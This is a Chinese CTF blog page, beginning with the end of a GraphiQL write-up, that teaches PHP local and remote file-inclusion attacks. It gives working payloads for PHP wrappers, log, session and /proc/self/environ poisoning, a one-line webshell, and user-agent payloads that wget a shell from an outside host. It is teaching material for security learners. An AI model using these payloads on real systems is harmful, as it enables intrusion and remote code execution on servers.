class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">39</span> <span class="string">'十十地动'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">40</span> <span class="string">'十十地同'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">41</span> <span class="string">'十十地工'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">42</span> <span class="string">'十十地也'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">43</span> <span class="string">'十十地能'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">44</span> <span class="string">'十十地下'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">45</span> <span class="string">'十十地过'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">46</span> <span class="string">'十十地子'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">47</span> <span class="string">'十十地说'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">48</span> <span class="string">'十十地产'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">49</span> <span class="string">'十十地种'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">50</span> <span class="string">'十十地面'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">51</span> <span class="string">'十十地而'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">52</span> <span class="string">'十十地方'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">53</span> <span class="string">'十十地后'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">54</span> <span class="string">'十十地多'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">55</span> <span class="string">'十十地定'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">56</span> <span class="string">'十十地行'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">57</span> <span class="string">'十十地学'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">58</span> <span class="string">'十十地法'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">59</span> <span class="string">'十十地所'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">60</span> <span class="string">'十十地民'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">61</span> <span class="string">'十十地得'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">62</span> <span class="string">'十十地经'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">63</span> <span class="string">'十十地十'</span> <span class="keyword">not</span> valid password.</span><br><span class="line"><span class="number">-1</span> <span class="string">'十十生爱'</span> <span class="keyword">not</span> valid password.</span><br><span class="line">password: HappY4Gr4phQL</span><br><span class="line">flag: flag&#123;a98b35476ffdc3c3f84c4f0fa648e021&#125;</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/11/14/GraphiQL/" data-id="clmvmvoj9000b1s7kd0cpakbj" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/GraphiQL/" rel="tag">GraphiQL</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-4 文件包含-php伪协议" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/11/14/4%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="article-date">
  <time datetime="2019-11-14T02:36:07.000Z" itemprop="datePublished">2019-11-14</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/11/14/4%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-php%E4%BC%AA%E5%8D%8F%E8%AE%AE/">文件包含_php伪协议</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="File-Inclusion（文件包含）"><a href="#File-Inclusion（文件包含）" class="headerlink" title="File Inclusion（文件包含）"></a>File Inclusion（文件包含）</h1><img src="/2019/11/14/4%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-php%E4%BC%AA%E5%8D%8F%E8%AE%AE/clip_image004-1573708873987.jpg" alt="img" style="zoom: 150%;">

<p>![image-20200728093954901](4 文件包含-php伪协议/image-20200728093954901.png)</p>
<h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><ol>
<li>具有相关的文件包含函数。</li>
<li>文件包含函数中存在动态变量，比如 <code>include $file;</code>。</li>
<li>攻击者能够控制该变量，比如<code>$file = $_GET[&#39;file&#39;];</code>。</li>
</ol>
<h3 id="本地文件包含-LFI"><a href="#本地文件包含-LFI" class="headerlink" title="本地文件包含(LFI)"></a>本地文件包含(LFI)</h3><img src="/2019/11/14/4%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-php%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20200728094302000.png" alt="image-20200728094302000" style="zoom:80%;">

<h3 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含(RFI)"></a>远程文件包含(RFI)</h3><p>![image-20200728101836227](4 文件包含-php伪协议/image-20200728101836227.png)</p>
<p> 需要php.ini中两个配置均为ON</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen = On</span><br><span class="line">allow_url_include = On 默认为off</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>($route == <span class="string">"share"</span>)&#123;</span><br><span class="line">        <span class="keyword">require_once</span> $basePath . <span class="string">'/action/m_share.php'</span>;</span><br><span class="line">    &#125;<span class="keyword">elseif</span>($route == <span class="string">"sharelink"</span>)&#123;</span><br><span class="line">        <span class="keyword">require_once</span> $basePath . <span class="string">'/action/m_sharelink.php'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p><img src="/2019/11/14/4%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-php%E4%BC%AA%E5%8D%8F%E8%AE%AE/clip_image008-1573708873987.jpg" alt="img"></p>
<p><img src="/2019/11/14/4%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-php%E4%BC%AA%E5%8D%8F%E8%AE%AE/clip_image012-1573708873988.jpg" alt="img"></p>
<p>外部包含文件成功，这样的话我们可以在1.php代码中写入恶意代码，拿到服务器的webshell：<code>http://192.168.217.133/dvwa/vulnerabilities/fi/?page=http://127.0.0.1/1.php</code></p>
<p> 可将远程的shell解析执行，最后一个<strong>问号</strong>或<strong>%00</strong>可以起到截断的作用。</p>
<h2 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h2><p>![image-20200728100137805](4 文件包含-php伪协议/image-20200728100137805.png)</p>
<p>php5.5.0版本后就不行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">include</span> $file;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>若在同目录下有<code>phpinfo.txt</code>    <code>&lt;?php phpinfo();?&gt;</code> 则访问：</p>
<p> <code>index.php?file=phpinfo.txt</code></p>
<p>即可解析文件内容</p>
<p>PHP内核是由C语言实现的，在连接字符串时，0字节(\x00)将作为字符串结束符。所以可用</p>
<h2 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a>路径长度截断</h2><p>![image-20200728101324293](4 文件包含-php伪协议/image-20200728101324293.png)</p>
<p>![image-20200728101502613](4 文件包含-php伪协议/image-20200728101502613.png)</p>
<p>点号截断：</p>
<blockquote>
<p>?file=../../../../../../../../../boot.ini/………[…]…………</p>
</blockquote>
<p>php 版本小于 5.2.8 可以成功，只适用 windows，点号需要长于 256</p>
<h2 id="php伪协议-lt-phpinfo-gt"><a href="#php伪协议-lt-phpinfo-gt" class="headerlink" title="php伪协议  &lt;?phpinfo();?&gt;"></a>php伪协议  <code>&lt;?phpinfo();?&gt;</code></h2><p>![image-20200728102417555](4 文件包含-php伪协议/image-20200728102417555.png)</p>
<p>![image-20200728103010885](4 文件包含-php伪协议/image-20200728103010885.png)</p>
<h3 id="file协议-file-可以执行所包含的文件"><a href="#file协议-file-可以执行所包含的文件" class="headerlink" title="file协议  file://   可以执行所包含的文件"></a>file协议  file://   可以执行所包含的文件</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=file:<span class="comment">//D:\app\phpstudy_pro\WWW\include\phpinfo.txt</span></span><br></pre></td></tr></table></figure>

<h3 id="php-filter-php-filter-read-convert-base64-encode-resource-只能读取源码-并不能包含执行源码"><a href="#php-filter-php-filter-read-convert-base64-encode-resource-只能读取源码-并不能包含执行源码" class="headerlink" title="php://filter    php://filter/read=convert.base64-encode/resource=  只能读取源码 并不能包含执行源码"></a>php://filter    php://filter/read=convert.base64-encode/resource=  只能读取源码 并不能包含执行源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">绝对路径</span><br><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=D:\app\phpstudy_pro\WWW\include\phpinfo.txt</span></span><br><span class="line"><span class="number">00</span>截断</span><br><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=D:\app\phpstudy_pro\WWW\include\phpinfo.txt%00</span></span><br><span class="line">相对路径</span><br><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=phpinfo.txt</span></span><br><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=../1.php</span></span><br><span class="line">远程文件包含</span><br><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=http://127.0.0.1/1.php</span></span><br><span class="line"></span><br><span class="line">?file=php:<span class="comment">//filter/convert.base64-encode/resource=index.php</span></span><br><span class="line">效果跟前面一样，少了read等关键字。在绕过一些waf时也许有用。</span><br><span class="line"></span><br><span class="line">php:<span class="comment">//filter/read=string.rot13</span></span><br><span class="line">指定末尾文件，可以读到base64编码后的文件内容，ctf中常有题目可读文件源码。</span><br><span class="line">?m=php:<span class="comment">//filter/read=string.rot13/resource=home.php</span></span><br></pre></td></tr></table></figure>

<h3 id="php-input-POST-这个post-hackbar用不了-可以执行所包含的文件-可以执行post里面的内容"><a href="#php-input-POST-这个post-hackbar用不了-可以执行所包含的文件-可以执行post里面的内容" class="headerlink" title="php://input   POST     这个post hackbar用不了   可以执行所包含的文件 可以执行post里面的内容"></a>php://input   POST     这个post hackbar用不了   可以执行所包含的文件 可以执行post里面的内容</h3><p> payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">需要：allow_url_include = on </span><br><span class="line">    </span><br><span class="line">?file=php:<span class="comment">//input</span></span><br><span class="line">POST:<span class="meta">&lt;?php</span>info();<span class="meta">?&gt;</span>   没有加php头也可以</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> `ls`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>例</p>
<p>![image-20200728192917874](4 文件包含-php伪协议/image-20200728192917874.png)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?content=php:<span class="comment">//input               php://input输入流里面算一个文件 </span></span><br><span class="line">POST:I<span class="string">'m glad to learn CTF  没有加php头也可以</span></span><br></pre></td></tr></table></figure>

<h3 id="data-可以执行所包含的文件-可以执行后面的内容"><a href="#data-可以执行所包含的文件-可以执行后面的内容" class="headerlink" title="data://  可以执行所包含的文件 可以执行后面的内容"></a>data://  可以执行所包含的文件 可以执行后面的内容</h3><p>条件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen &#x3D; On</span><br><span class="line">allow_url_include &#x3D; On</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">没有加php头也可以</span><br><span class="line">?file&#x3D;data:text&#x2F;plain,&lt;?phpinfo();?&gt;  去掉&#x2F;&#x2F;也能执行</span><br><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">?file&#x3D;data:text&#x2F;plain,&lt;?php phpinfo();?&gt;   此处,不能改为;</span><br><span class="line">?file&#x3D;data:text&#x2F;plain;charset&#x3D;utf-8,&lt;?php phpinfo();?&gt;</span><br><span class="line">00截断</span><br><span class="line">?file&#x3D;data:text&#x2F;plain,&lt;?php phpinfo();?&gt;%00</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">调用php函数执行系统命令 命令执行</span><br><span class="line">?file&#x3D;data:text&#x2F;plain,&lt;?php system(&#39;whoami&#39;);?&gt;</span><br><span class="line">?file&#x3D;data:text&#x2F;plain,&lt;?php echo system(“cat &#x2F;flag”));?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">如果对特定字符进行了过滤，比如flag &lt; &gt; ? ( ) 	可以使用base64进行编码</span><br><span class="line">?file&#x3D;data:text&#x2F;plain;base64,ZmxhZy5waHA&#x3D;             flag.php</span><br><span class="line">?file&#x3D;data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b    &lt;?php phpinfo();?&gt;   还真得把+换成%2b 不然url编码会把+去掉</span><br><span class="line">?file&#x3D;data:text&#x2F;plain;base64,PD9waHAgcmVhZGZpbGUoIi4vZmxhZy5waHAiKTs&#x2F;Pg&#x3D;&#x3D;   &lt;?php readfile(&quot;.&#x2F;flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="phar"><a href="#phar" class="headerlink" title="phar ://"></a>phar ://</h3><p>PHP归档，解压缩协议   </p>
<p>php 版本大于等于 php5.3.0</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">上传包含任何格式文件shell的压缩包，再用phar协议解析</span><br><span class="line">指定相对路径</span><br><span class="line">?file&#x3D;phar:&#x2F;&#x2F;shell.zip&#x2F;phpinfo.txt</span><br><span class="line">指定绝对路径</span><br><span class="line">?file&#x3D;phar:&#x2F;&#x2F;D:&#x2F;index&#x2F;www&#x2F;fileinclude&#x2F;shell.zip&#x2F;phpinfo.txt</span><br><span class="line"></span><br><span class="line">上传一个txt ,内容为 &lt;?php echo system(“cat &#x2F;flag”));?&gt;</span><br><span class="line">访问upload.php?file&#x3D;phar:&#x2F;&#x2F;upload&#x2F;........txt  文件包含</span><br></pre></td></tr></table></figure>

<h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p>需要绝对路径</p>
<p>构造zip包的方法同phar。</p>
<p>但使用zip协议，需要指定绝对路径，同时将<code>#</code>编码为<code>%23</code>，之后填上压缩包内的文件。</p>
<p><code>?file=zip://F:/web/phpStudy/WWW/serialized/okshell.zip%23okshell.png</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"> $_GET[&#39;a&#39;]($_GET[&#39;b&#39;]);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">zip:&#x2F;&#x2F;xxx.png%23shell</span><br><span class="line">phar:&#x2F;&#x2F;xxx.png&#x2F;shell</span><br><span class="line">?fp&#x3D;zip:&#x2F;&#x2F;uploads&#x2F;515969bfe90c2f52fbcd7e5818e8688b681eea4e.png%23shell&amp;a&#x3D;system&amp;b&#x3D;ls</span><br></pre></td></tr></table></figure>



<h3 id="compress-bzip2"><a href="#compress-bzip2" class="headerlink" title="compress.bzip2://"></a>compress.bzip2://</h3><p>?file=compress.bzip2://./file.jpg</p>
<p>可执行file.jpg里面代码。</p>
<h3 id="包含日志文件"><a href="#包含日志文件" class="headerlink" title="包含日志文件"></a>包含日志文件</h3><p>先通过读取httpd的配置文件httpd.conf,找日志文件所在目录<br> 常见日志文件位置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1...&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">\1.   &#x2F;usr&#x2F;local&#x2F;apache&#x2F;conf&#x2F;http.conf</span><br><span class="line"> 3...&#x2F;apache&#x2F;logs&#x2F;error.log</span><br></pre></td></tr></table></figure>

<p>Metasploit有脚本完成自动化攻击</p>
<p>可以包含 httpd.conf 查看日志文件位置以及文件名格式配置，这里就直接找到一个 log 进行利用（php_error.log），该文件会记录 php 在执行中出现的错误，<br><img src="http://www.2cto.com/uploadfile/2013/0119/20130119021143479.jpg" alt="img"><br>图 13.php_error 文件内容<br>所以我们直接访问 test.php?file=../<?php phpinfo ();?>.php，将会被记录下来。这样便成功将 php 代码写进 log 文件。<br>直接访问：<br><img src="http://www.2cto.com/uploadfile/2013/0119/20130119021143163.jpg" alt="img"><br>图 14.get 请求中插入 php 代码<br>返回空白，这是由于 webserver 未开启报错。<br>包含后如图：<br><img src="http://www.2cto.com/uploadfile/2013/0119/20130119021143673.jpg" alt="img"></p>
<p><em>利用条件：</em>需要知道服务器日志的存储路径，且日志文件可读。</p>
<p>很多时候，web 服务器会将请求写入到日志文件中，比如说 apache。在用户发起请求时，会将请求写入 access.log，当发生错误时将错误写入 error.log。默认情况下，日志保存路径在 <code>/var/log/apache2/</code>。</p>
<blockquote>
<p>?file=../../../../../../../../../var/log/apache/error.log</p>
</blockquote>
<p>1、提交如下请求，将 payload 插入日志</p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-2822697/pvk5sylnp1.png?imageView2/2/w/1620" alt="img"></p>
<p>2、可以尝试利用 UA 插入 payload 到日志文件</p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-2822697/b6h1gqd4dx.png?imageView2/2/w/1620" alt="img"></p>
<p>3、MSF 攻击模块</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/webapp/php_includeset rhost <span class="number">192.168</span><span class="number">.159</span><span class="number">.128</span>set rport <span class="number">80</span>set phpuri /index.php?file=xxLFIxxset path http:<span class="comment">//172.18.176.147/set payload php/meterpreter/bind_tcpset srvport 8888exploit -z</span></span><br></pre></td></tr></table></figure>

<p><strong>日志默认路径</strong></p>
<p>apache+Linux 日志默认路径</p>
<blockquote>
<p>/etc/httpd/logs/access_log</p>
</blockquote>
<p>或者</p>
<blockquote>
<p>/var/log/httpd/access log</p>
</blockquote>
<p>apache+win2003 日志默认路径</p>
<blockquote>
<p>D:/xampp/apache/logs/access.log D:/xampp/apache/logs/error.log</p>
</blockquote>
<p>IIS6.0+win2003 默认日志文件</p>
<blockquote>
<p>C:/WINDOWS/system32/Logfiles</p>
</blockquote>
<p>IIS7.0+win2003 默认日志文件</p>
<blockquote>
<p>%SystemDrive%/inetpub/logs/LogFiles</p>
</blockquote>
<p>nginx 日志文件在用户安装目录的 logs 目录下</p>
<p>如安装目录为 <code>/usr/local/nginx</code>,则日志目录就是在</p>
<blockquote>
<p>/usr/local/nginx/logs</p>
</blockquote>
<p>也可通过其配置文件 Nginx.conf，获取到日志的存在路径</p>
<blockquote>
<p>/opt/nginx/logs/access.log</p>
</blockquote>
<p><strong>web 中间件默认配置</strong></p>
<p>apache+linux 默认配置文件</p>
<blockquote>
<p>/etc/httpd/conf/httpd.conf</p>
</blockquote>
<p>或者</p>
<blockquote>
<p>index.php?page=/etc/init.d/httpd</p>
</blockquote>
<p>IIS6.0+win2003 配置文件</p>
<blockquote>
<p>C:/Windows/system32/inetsrv/metabase.xml</p>
</blockquote>
<p>IIS7.0+WIN 配置文件</p>
<blockquote>
<p>C:/Windows/System32/inetsrv/config/application/Host.config</p>
</blockquote>
<h3 id="包含Session"><a href="#包含Session" class="headerlink" title="包含Session"></a><strong>包含Session</strong></h3><p>利用条件：session文件路径已知，且其中内容部分可控。</p>
<p>姿势：</p>
<p>php的session文件的保存路径可以在phpinfo的session.save_path看到。</p>
<p>常见的php-session存放位置：</p>
<ol>
<li>/var/lib/php/sess_PHPSESSID</li>
<li>/var/lib/php/sess_PHPSESSID</li>
<li>/tmp/sess_PHPSESSID</li>
<li>/tmp/sessions/sess_PHPSESSID</li>
</ol>
<p>session的文件名格式为sess_[phpsessid]。而phpsessid在发送的请求的cookie字段中可以看到。</p>
<p>要包含并利用的话，需要能控制部分sesssion文件的内容。暂时没有通用的办法。有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码。</p>
<p>比如这篇文章：<a href="http://kb.hitcon.org/post/165429468072/透過-lfi-引入-php-session-檔案觸發-rce" target="_blank" rel="noopener">透過 LFI 引入 PHP session 檔案觸發 RCE</a></p>
<p><em>利用条件：</em>session 文件路径已知，且其中内容部分可控。</p>
<p>PHP 默认生成的 Session 文件往往存放在 /tmp 目录下</p>
<blockquote>
<p>/tmp/sess_SESSIONID</p>
<p>?file=../../../../../../tmp/sess_tnrdo9ub2tsdurntv0pdir1no7</p>
</blockquote>
<p>session 文件一般在 /tmp 目录下，格式为 <code>sess_[your phpsessid value]</code>，有时候也有可能在 <code>/var/lib/php5</code> 之类的，在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制 session 的值，也许你能够获得一个 shell</p>
<p><strong>包含 /proc/self/environ 文件</strong></p>
<p><em>利用条件：</em></p>
<p>1、php 以 cgi 方式运行，这样 environ 才会保持 UA 头。</p>
<p>2、environ <a href="https://cloud.tencent.com/product/cfs?from=10680" target="_blank" rel="noopener">文件存储</a>位置已知，且 environ 文件可读。</p>
<p><em>姿势：</em></p>
<p><code>proc/self/environ</code> 中会保存 user-agent 头。如果在 user-agent 中插入 php 代码，则 php 代码会被写入到 environ 中。之后再包含它，即可。</p>
<blockquote>
<p>?file=../../../../../../../proc/self/environ</p>
</blockquote>
<p>选择 User-Agent 写代码如下：</p>
<blockquote>
<?system('wget http://www.yourweb.com/oneword.txt -O shell.php');?>
</blockquote>
<p>然后提交请求。</p>
<h3 id="包含-proc-self-environ-文件"><a href="#包含-proc-self-environ-文件" class="headerlink" title="包含/proc/self/environ 文件"></a><strong>包含/proc/self/environ 文件</strong></h3><p><code>index.php?page=../../../../../proc/self/environ</code><br> 可以看到Web进程运行时的环境变量，其中用户可以控制部分，比如对User-Agent注入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">\<span class="number">1.</span>    <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">\<span class="number">2.</span>      system(<span class="string">'wget http://hacker/Shells/phpshell.txt -O shell.php'</span>);</span><br><span class="line"></span><br><span class="line">\<span class="number">3.</span>    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>但是用户可通过修改浏览器的 agent 信息插入自己的内容到该文件，将 php 代码写进去之后再利用 LFI 进行包含就可以实现漏洞的利用。<br>首先，验证访问权限，看是否有权限读取该文件内容<br><img src="http://www.2cto.com/uploadfile/2013/0119/20130119021143439.jpg" alt="img"></p>
<h3 id="包含-web-server-日志文件"><a href="#包含-web-server-日志文件" class="headerlink" title="包含 web server 日志文件"></a>包含 web server 日志文件</h3><p>Apache 的日志文件在 LFI 漏洞的利用中是非常常见的。因为不管我们提交的 Get 请求或者 Post 请求都会被 apache 记录到日志文件里。所以我们可以控制请求内容，将恶意代码写入日志文件，从而实现包含。<br>首先：查看是否有权限进行包含<br><img src="http://www.2cto.com/uploadfile/2013/0119/20130119021143509.jpg" alt="img"></p>
<h2 id="包含日志"><a href="#包含日志" class="headerlink" title="包含日志"></a>包含日志</h2><h3 id="访问日志"><a href="#访问日志" class="headerlink" title="访问日志"></a>访问日志</h3><p>利用条件： 需要知道服务器日志的存储路径，且日志文件可读。</p>
<p>姿势：</p>
<p>很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/。</p>
<p>但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析。可以使用burp截包后修改。<br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/12.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/12.png?raw=true" alt="img"></a></p>
<p>正常的php代码已经写入了 /var/log/apache2/access.log。然后进行包含即可。<br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/13.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/13.png?raw=true" alt="img"></a></p>
<p>在一些场景中，log的地址是被修改掉的。你可以通过读取相应的配置文件后，再进行包含。</p>
<p>这里提供一道包含日志的CTF题目：<a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/#Methon-Two" target="_blank" rel="noopener">SHACTF-2017- Bon Appétit (100)-writeup</a></p>
<h3 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h3><p>利用条件：需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log</p>
<p>姿势：</p>
<p>用ssh连接：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-207-93-ubuntu:~$ ssh &#39;&lt;?php phpinfo(); ?&gt;&#39;@remotehost</span><br></pre></td></tr></table></figure>



<p>之后会提示输入密码等等，随便输入。</p>
<p>然后在remotehost的ssh-log中即可写入php代码：<br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/17.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/17.png?raw=true" alt="img"></a></p>
<p>之后进行文件包含即可。</p>
<p>参考：<a href="http://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/" target="_blank" rel="noopener">RCE with LFI and SSH Log Poisoning</a></p>
<h2 id="包含environ"><a href="#包含environ" class="headerlink" title="包含environ"></a>包含environ</h2><p>利用条件：</p>
<ol>
<li>php以cgi方式运行，这样environ才会保持UA头。</li>
<li>environ文件存储位置已知，且environ文件可读。</li>
</ol>
<p>姿势：</p>
<p>proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。</p>
<p>可以参考这个：</p>
<ol>
<li><a href="http://websecuritylog.blogspot.jp/2010/06/procselfenviron-injection.html" target="_blank" rel="noopener">The proc/self/environ Injection</a></li>
<li><a href="https://www.exploit-db.com/papers/12886/" target="_blank" rel="noopener">shell via LFI - proc/self/environ method</a></li>
</ol>
<h2 id="包含fd"><a href="#包含fd" class="headerlink" title="包含fd"></a>包含fd</h2><p>跟包含environ类似。</p>
<p>参考： <a href="https://highon.coffee/blog/lfi-cheat-sheet/#procselffd-lfi-method" target="_blank" rel="noopener">LFI Cheat Sheet：/proc/self/environ LFI Method</a></p>
<h2 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h2><p><a href="http://images2015.cnblogs.com/blog/804631/201511/804631-20151116135028890-525890377.jpg" target="_blank" rel="noopener"><img src="http://images2015.cnblogs.com/blog/804631/201511/804631-20151116135028890-525890377.jpg" alt="img"></a></p>
